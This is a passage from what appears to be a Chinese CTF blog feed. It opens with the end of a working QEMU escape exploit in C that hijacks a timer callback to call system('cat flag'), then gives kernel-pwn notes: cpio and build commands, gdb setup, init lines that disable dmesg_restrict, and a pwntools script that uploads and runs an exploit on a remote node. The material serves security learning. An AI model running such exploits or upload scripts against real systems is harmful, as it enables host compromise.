class="keyword">include</span> <span class="string">&lt;errno.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;signal.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;ctype.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;termios.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;assert.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/io.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">err_exit</span><span class="params">(<span class="type">char</span> *msg)</span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[31m\033[1m[x] Error at: \033[0m%s\n&quot;</span>, msg);</span><br><span class="line">    sleep(<span class="number">5</span>);</span><br><span class="line">    <span class="built_in">exit</span>(EXIT_FAILURE);</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="type">void</span> <span class="title function_">info</span><span class="params">(<span class="type">char</span> *msg)</span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[32m\033[1m[+] %s\n\033[0m&quot;</span>, msg);</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="type">void</span> <span class="title function_">hexx</span><span class="params">(<span class="type">char</span> *msg, <span class="type">size_t</span> value)</span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[32m\033[1m[+] %s: %#lx\n\033[0m&quot;</span>, msg, value);</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="type">void</span> <span class="title function_">binary_dump</span><span class="params">(<span class="type">char</span> *desc, <span class="type">void</span> *addr, <span class="type">int</span> len)</span> &#123;</span><br><span class="line">    <span class="type">uint64_t</span> *buf64 = (<span class="type">uint64_t</span> *) addr;</span><br><span class="line">    <span class="type">uint8_t</span> *buf8 = (<span class="type">uint8_t</span> *) addr;</span><br><span class="line">    <span class="keyword">if</span> (desc != <span class="literal">NULL</span>) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;\033[33m[*] %s:\n\033[0m&quot;</span>, desc);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; len / <span class="number">8</span>; i += <span class="number">4</span>) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;  %04x&quot;</span>, i * <span class="number">8</span>);</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">0</span>; j &lt; <span class="number">4</span>; j++) &#123;</span><br><span class="line">            i + j &lt; len / <span class="number">8</span> ? <span class="built_in">printf</span>(<span class="string">&quot; 0x%016lx&quot;</span>, buf64[i + j]) : <span class="built_in">printf</span>(<span class="string">&quot;                   &quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;   &quot;</span>);</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">0</span>; j &lt; <span class="number">32</span> &amp;&amp; j + i * <span class="number">8</span> &lt; len; j++) &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;%c&quot;</span>, <span class="built_in">isprint</span>(buf8[i * <span class="number">8</span> + j]) ? buf8[i * <span class="number">8</span> + j] : <span class="string">&#x27;.&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> *mmio_mem;</span><br><span class="line"><span class="type">void</span> <span class="title function_">mmio_write</span><span class="params">(<span class="type">size_t</span> offset, <span class="type">uint64_t</span> value)</span> &#123;</span><br><span class="line">    *(<span class="type">uint64_t</span> *) (mmio_mem + offset) = value;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">uint32_t</span> <span class="title function_">mmio_read</span><span class="params">(<span class="type">size_t</span> offset)</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> *(<span class="type">uint64_t</span> *) (mmio_mem + offset);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">size_t</span> <span class="title function_">read_val</span><span class="params">(<span class="type">int</span> offset)</span>&#123;</span><br><span class="line">    mmio_write(<span class="number">0x10</span>, offset + <span class="number">4</span>);</span><br><span class="line">    <span class="type">size_t</span> a = mmio_read(<span class="number">0x20</span>);</span><br><span class="line">    mmio_write(<span class="number">0x10</span>, offset);</span><br><span class="line">    <span class="keyword">return</span> (a &lt;&lt; <span class="number">32</span>) + (<span class="type">size_t</span>)mmio_read(<span class="number">0x20</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">write_val</span><span class="params">(<span class="type">uint64_t</span> offset, <span class="type">size_t</span> val)</span>&#123;</span><br><span class="line">    mmio_write(<span class="number">0x20</span>, (offset &lt;&lt; <span class="number">32</span>) + (val &amp; <span class="number">0xffffffff</span>));</span><br><span class="line">    mmio_write(<span class="number">0x20</span>, ((offset + <span class="number">4</span>) &lt;&lt; <span class="number">32</span>) + (val &gt;&gt; <span class="number">32</span>));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> mmio_fd = open(<span class="string">&quot;/sys/devices/pci0000:00/0000:00:04.0/resource0&quot;</span>, O_RDWR | O_SYNC);</span><br><span class="line">    <span class="keyword">if</span> (mmio_fd == <span class="number">-1</span>) &#123;</span><br><span class="line">        perror(<span class="string">&quot;[-] failed to open mmio.&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(EXIT_FAILURE);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    mmio_mem = mmap(<span class="number">0</span>, <span class="number">0x1000</span>, PROT_READ | PROT_WRITE, MAP_SHARED, mmio_fd, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">if</span> (mmio_mem == MAP_FAILED) &#123;</span><br><span class="line">        perror(<span class="string">&quot;[-] failed to mmap mmio.&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(EXIT_FAILURE);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (mlock(mmio_mem, <span class="number">0x1000</span>) == <span class="number">-1</span>) &#123;</span><br><span class="line">        perror(<span class="string">&quot;[-] failed to mlock mmio_mem.&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(EXIT_FAILURE);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="type">size_t</span> elf_base = read_val(<span class="number">-192</span>) - <span class="number">0xf581e0</span>;</span><br><span class="line">    <span class="type">size_t</span> buf_addr = read_val(<span class="number">-184</span>) + <span class="number">0xB40</span>;</span><br><span class="line">    <span class="type">size_t</span> system_plt = elf_base + <span class="number">0x312040</span>;</span><br><span class="line">    <span class="type">size_t</span> main_loop_tlg = elf_base + <span class="number">0x14b9480</span>;  </span><br><span class="line">    hexx(<span class="string">&quot;elf_base&quot;</span>, elf_base);</span><br><span class="line">    hexx(<span class="string">&quot;buf_addr&quot;</span>, buf_addr);</span><br><span class="line">    hexx(<span class="string">&quot;main_loop_tlg&quot;</span>, main_loop_tlg);</span><br><span class="line"></span><br><span class="line">    <span class="type">size_t</span> timer_list_addr = read_val(main_loop_tlg + <span class="number">8</span> - buf_addr);</span><br><span class="line">    hexx(<span class="string">&quot;timer_list_addr&quot;</span>, timer_list_addr);</span><br><span class="line"></span><br><span class="line">    write_val(<span class="number">8</span>, buf_addr);  <span class="comment">// QEMUTimerList *timer_list</span></span><br><span class="line">    write_val(<span class="number">0x10</span>, system_plt);  <span class="comment">// QEMUTimerCB *cb</span></span><br><span class="line">    write_val(<span class="number">0x18</span>, buf_addr + <span class="number">0x30</span>);  <span class="comment">// void *opaque</span></span><br><span class="line">    write_val(<span class="number">0x30</span>,<span class="number">0x67616c6620746163</span>);  <span class="comment">// cat flag</span></span><br><span class="line"></span><br><span class="line">    mmio_write(<span class="number">0x10</span>, timer_list_addr + <span class="number">0x40</span> - buf_addr);</span><br><span class="line">    mmio_write(<span class="number">0x30</span>, buf_addr);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;最近找时间入门了一下&lt;code&gt;qemu&lt;/code&gt;逃逸，发现挺有意思的。感觉其实和用户态的&lt;code&gt;pwn&lt;/code&gt;差不多，目标是通过分析&lt;code&gt;qemu-system&lt;/code&gt;这个&lt;code&gt;elf&lt;/code&gt;中的漏洞使其执行自己想要的函数。在该&lt;co</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>linux kernel</title>
    <link href="https://qanux.github.io/2024/01/24/linux%20kernel%EF%BC%88%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0%EF%BC%89/"/>
    <id>https://qanux.github.io/2024/01/24/linux%20kernel%EF%BC%88%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0%EF%BC%89/</id>
    <published>2024-01-23T16:00:00.000Z</published>
    <updated>2024-04-17T09:58:05.213Z</updated>
    
    <content type="html"><![CDATA[<p>主要记录一些入门级别的<code>kernel pwn</code>和一些平时做题要经常用到的命令</p><h1 id="做题技巧"><a href="#做题技巧" class="headerlink" title="做题技巧"></a>做题技巧</h1><h2 id="常用命令"><a href="#常用命令" class="headerlink" title="常用命令"></a>常用命令</h2><h3 id="解包"><a href="#解包" class="headerlink" title="解包"></a>解包</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cpio -idmv &lt; ./rootfs.cpio</span><br></pre></td></tr></table></figure><h3 id="打包"><a href="#打包" class="headerlink" title="打包"></a>打包</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find . | cpio -o --format=newc &gt; ./rootfs.cpio</span><br></pre></td></tr></table></figure><h3 id="利用musl静态编译exp"><a href="#利用musl静态编译exp" class="headerlink" title="利用musl静态编译exp"></a>利用musl静态编译exp</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">musl-gcc -static -masm=intel -pthread exp.c -o exp</span><br></pre></td></tr></table></figure><h3 id="查找ko文件的基址"><a href="#查找ko文件的基址" class="headerlink" title="查找ko文件的基址"></a>查找ko文件的基址</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat proc/modules</span><br></pre></td></tr></table></figure><h3 id="编译exp并将其打包进题目中"><a href="#编译exp并将其打包进题目中" class="headerlink" title="编译exp并将其打包进题目中"></a>编译exp并将其打包进题目中</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">!/bin/sh</span></span><br><span class="line"></span><br><span class="line">cp -r rootfs rootfs_tmp</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">musl-gcc -static -masm=intel -pthread exp.c -o exp</span></span><br><span class="line">gcc -static -masm=intel -pthread exp.c -o exp</span><br><span class="line">cp exp rootfs_tmp/</span><br><span class="line"></span><br><span class="line">cd rootfs_tmp || exit</span><br><span class="line">find . | cpio -o -H newc &gt;../rootfs.cpio</span><br><span class="line">cd ..</span><br><span class="line"></span><br><span class="line">sudo rm -rf rootfs_tmp</span><br></pre></td></tr></table></figure><h3 id="从bzImage中提取vmlinux"><a href="#从bzImage中提取vmlinux" class="headerlink" title="从bzImage中提取vmlinux"></a>从bzImage中提取vmlinux</h3><h4 id="extract-linux（脚本源码）"><a href="#extract-linux（脚本源码）" class="headerlink" title="extract_linux（脚本源码）"></a>extract_linux（脚本源码）</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">!/bin/sh</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">SPDX-License-Identifier: GPL-2.0-only</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">----------------------------------------------------------------------</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">extract-vmlinux - Extract uncompressed vmlinux from a kernel image</span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash"></span></span><br><span class="line"><span class="language-bash"><span class="comment"># Inspired from extract-ikconfig</span></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">(c) 2009,2010 Dick Streefland &lt;dick@streefland.net&gt;</span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash"></span></span><br><span class="line"><span class="language-bash"><span class="comment"># (c) 2011      Corentin Chary &lt;corentin.chary@gmail.com&gt;</span></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash"></span></span><br><span class="line"><span class="language-bash"><span class="comment"># ----------------------------------------------------------------------</span></span></span><br><span class="line"></span><br><span class="line">check_vmlinux()</span><br><span class="line">&#123;</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">Use readelf to check <span class="keyword">if</span> it<span class="string">&#x27;s a valid ELF</span></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash"><span class="string">TODO: find a better to way to check that it&#x27;</span>s really vmlinux</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">      and not just an elf</span></span><br><span class="line">readelf -h $1 &gt; /dev/null 2&gt;&amp;1 || return 1</span><br><span class="line"></span><br><span class="line">cat $1</span><br><span class="line">exit 0</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">try_decompress()</span><br><span class="line">&#123;</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">The obscure use of the <span class="string">&quot;tr&quot;</span> filter is to work around older versions of</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash"><span class="string">&quot;grep&quot;</span> that report the byte offset of the line instead of the pattern.</span></span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">Try to find the header (<span class="variable">$1</span>) and decompress from here</span></span><br><span class="line">forpos in `tr &quot;$1\n$2&quot; &quot;\n$2=&quot; &lt; &quot;$img&quot; | grep -abo &quot;^$2&quot;`</span><br><span class="line">do</span><br><span class="line">pos=$&#123;pos%%:*&#125;</span><br><span class="line">tail -c+$pos &quot;$img&quot; | $3 &gt; $tmp 2&gt; /dev/null</span><br><span class="line">check_vmlinux $tmp</span><br><span class="line">done</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">Check invocation:</span></span><br><span class="line">me=$&#123;0##*/&#125;</span><br><span class="line">img=$1</span><br><span class="line">if[ $# -ne 1 -o ! -s &quot;$img&quot; ]</span><br><span class="line">then</span><br><span class="line">echo &quot;Usage: $me &lt;kernel-image&gt;&quot; &gt;&amp;2</span><br><span class="line">exit 2</span><br><span class="line">fi</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">Prepare temp files:</span></span><br><span class="line">tmp=$(mktemp /tmp/vmlinux-XXX)</span><br><span class="line">trap &quot;rm -f $tmp&quot; 0</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">That didn<span class="string">&#x27;t work, so retry after decompression.</span></span></span><br><span class="line">try_decompress &#x27;\037\213\010&#x27; xy    gunzip</span><br><span class="line">try_decompress &#x27;\3757zXZ\000&#x27; abcde unxz</span><br><span class="line">try_decompress &#x27;BZh&#x27;          xy    bunzip2</span><br><span class="line">try_decompress &#x27;\135\0\0\0&#x27;   xxx   unlzma</span><br><span class="line">try_decompress &#x27;\211\114\132&#x27; xy    &#x27;lzop -d&#x27;</span><br><span class="line">try_decompress &#x27;\002!L\030&#x27;   xxx   &#x27;lz4 -d&#x27;</span><br><span class="line">try_decompress &#x27;(\265/\375&#x27;   xxx   unzstd</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash"><span class="string">Finally check for uncompressed images or objects:</span></span></span><br><span class="line">check_vmlinux $img</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash"><span class="string">Bail out:</span></span></span><br><span class="line">echo &quot;$me: Cannot find vmlinux.&quot; &gt;&amp;2</span><br></pre></td></tr></table></figure><h4 id="使用方式"><a href="#使用方式" class="headerlink" title="使用方式"></a>使用方式</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./extract_linux bzImage &gt; vmlinux</span><br></pre></td></tr></table></figure><h3 id="常用辅助脚本"><a href="#常用辅助脚本" class="headerlink" title="常用辅助脚本"></a>常用辅助脚本</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">err_exit</span><span class="params">(<span class="type">char</span> *msg)</span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[31m\033[1m[x] Error at: \033[0m%s\n&quot;</span>, msg);</span><br><span class="line">    sleep(<span class="number">5</span>);</span><br><span class="line">    <span class="built_in">exit</span>(EXIT_FAILURE);</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="type">void</span> <span class="title function_">info</span><span class="params">(<span class="type">char</span> *msg)</span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[32m\033[1m[+] %s\n\033[0m&quot;</span>, msg);</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="type">void</span> <span class="title function_">hexx</span><span class="params">(<span class="type">char</span> *msg, <span class="type">size_t</span> value)</span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[32m\033[1m[+] %s: %#lx\n\033[0m&quot;</span>, msg, value);</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="type">void</span> <span class="title function_">binary_dump</span><span class="params">(<span class="type">char</span> *desc, <span class="type">void</span> *addr, <span class="type">int</span> len)</span> &#123;</span><br><span class="line">    <span class="type">uint64_t</span> *buf64 = (<span class="type">uint64_t</span> *) addr;</span><br><span class="line">    <span class="type">uint8_t</span> *buf8 = (<span class="type">uint8_t</span> *) addr;</span><br><span class="line">    <span class="keyword">if</span> (desc != <span class="literal">NULL</span>) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;\033[33m[*] %s:\n\033[0m&quot;</span>, desc);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; len / <span class="number">8</span>; i += <span class="number">4</span>) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;  %04x&quot;</span>, i * <span class="number">8</span>);</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">0</span>; j &lt; <span class="number">4</span>; j++) &#123;</span><br><span class="line">            i + j &lt; len / <span class="number">8</span> ? <span class="built_in">printf</span>(<span class="string">&quot; 0x%016lx&quot;</span>, buf64[i + j]) : <span class="built_in">printf</span>(<span class="string">&quot;                   &quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;   &quot;</span>);</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">0</span>; j &lt; <span class="number">32</span> &amp;&amp; j + i * <span class="number">8</span> &lt; len; j++) &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;%c&quot;</span>, <span class="built_in">isprint</span>(buf8[i * <span class="number">8</span> + j]) ? buf8[i * <span class="number">8</span> + j] : <span class="string">&#x27;.&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="远程脚本"><a href="#远程脚本" class="headerlink" title="远程脚本"></a>远程脚本</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"> </span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line"> </span><br><span class="line">sla = <span class="keyword">lambda</span> x,y : p.sendlineafter(x,y)</span><br><span class="line">sa =  <span class="keyword">lambda</span> x,y : p.sendafter(x,y)</span><br><span class="line">ru =  <span class="keyword">lambda</span> x   : p.recvuntil(x)</span><br><span class="line"> </span><br><span class="line">p = remote(<span class="string">&#x27;node2.anna.nssctf.cn&#x27;</span>, <span class="number">28115</span>)</span><br><span class="line"> </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">send_cmd</span>(<span class="params">cmd</span>):</span><br><span class="line">    sla(<span class="string">&#x27;$ &#x27;</span>, cmd)</span><br><span class="line"> </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">upload</span>():</span><br><span class="line">    lg = log.progress(<span class="string">&#x27;Upload&#x27;</span>)</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;exp&#x27;</span>, <span class="string">&#x27;rb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        data = f.read()</span><br><span class="line">    encoded = base64.b64encode(data)</span><br><span class="line">    encoded = <span class="built_in">str</span>(encoded)[<span class="number">2</span>:-<span class="number">1</span>]</span><br><span class="line">    send_cmd(<span class="string">&#x27;cd /proc/141/net&#x27;</span>)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(encoded), <span class="number">300</span>):</span><br><span class="line">        lg.status(<span class="string">&#x27;%d / %d&#x27;</span> % (i, <span class="built_in">len</span>(encoded)))</span><br><span class="line">        send_cmd(<span class="string">&#x27;echo -n &quot;%s&quot; &gt;&gt; benc&#x27;</span> % (encoded[i:i+<span class="number">300</span>]))</span><br><span class="line">    send_cmd(<span class="string">&#x27;cat benc | base64 -d &gt; exp&#x27;</span>)</span><br><span class="line">    send_cmd(<span class="string">&#x27;chmod +x exp&#x27;</span>)</span><br><span class="line">    send_cmd(<span class="string">&#x27;./exp&#x27;</span>)</span><br><span class="line">    lg.success()</span><br><span class="line"> </span><br><span class="line"><span class="comment"># os.system(&#x27;musl-gcc -w -s -static -o3 exp.c -o exp&#x27;)</span></span><br><span class="line">upload()</span><br><span class="line"> </span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h3 id="init文件"><a href="#init文件" class="headerlink" title="init文件"></a>init文件</h3><p>可以加上下面两行，第一行是因为内核中的打印都是用<code>printk</code>的，需要用<code>dmesg</code>看日志，加上这一行才能不需要<code>root</code>运行<code>dmesg</code>；第二行是把那个自定义模块的基址打印到另一个文件中，调试要用。不过把原先的<code>init</code>文件中的<code>echo 1</code>的那两句删掉应该也是同样效果的</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">echo 0 &gt; /proc/sys/kernel/dmesg_restrict</span><br><span class="line">cat /sys/module/core/sections/.text &gt; /tmp/core_text</span><br></pre></td></tr></table></figure><h2 id="gdb调试"><a href="#gdb调试" class="headerlink" title="gdb调试"></a>gdb调试</h2><p>通常<code>start.sh</code> 文件里会存在一行为：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-s \</span><br></pre></td></tr></table></figure><p>这个<code>-s</code>为<code>-gdb tcp::1234</code>的缩写,表示监听<code>1234</code>端口,在<code>gdb</code>中可以通过<code>target remote localhost:1234</code>连接<br>首先我们要通过<code>./start.sh</code>来启动内核，然后：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">gdb vmlinux</span><br><span class="line"><span class="meta prompt_">pwndbg&gt; </span><span class="language-bash">add-symbol-file core.ko `这里写那个core_text文件中泄漏出来的基址`</span></span><br><span class="line"><span class="meta prompt_">pwndbg&gt; </span><span class="language-bash">target remote:1234</span></span><br><span class="line"><span class="meta prompt_">pwndbg&gt; </span><span class="language-bash">b *(core_copy_func+104)</span></span><br></pre></td></tr></table></figure><p>第一句就是根据基址加载模块的符号，第二句是远程调试进入虚拟机，第三句就可以愉快地用符号下断点了</p><h1 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h1><h2 id="强网杯2018-core"><a href="#强网杯2018-core" class="headerlink" title="强网杯2018 core"></a>强网杯2018 core</h2><p>找了半天总算找到一题相对简单<code>kernel pwn</code>了</p><h3 id="程序分析"><a href="#程序分析" class="headerlink" title="程序分析"></a>程序分析</h3><p>我们主要看的是<code>core.ko</code>这一个文件，这是出题人写的内核驱动模块，通常漏洞都是在这里。做题所需要的函数和<code>gadget</code>可以在<code>vmlinux</code>中找</p><h4 id="core-ioctl"><a href="#core-ioctl" class="headerlink" title="core_ioctl"></a>core_ioctl</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span 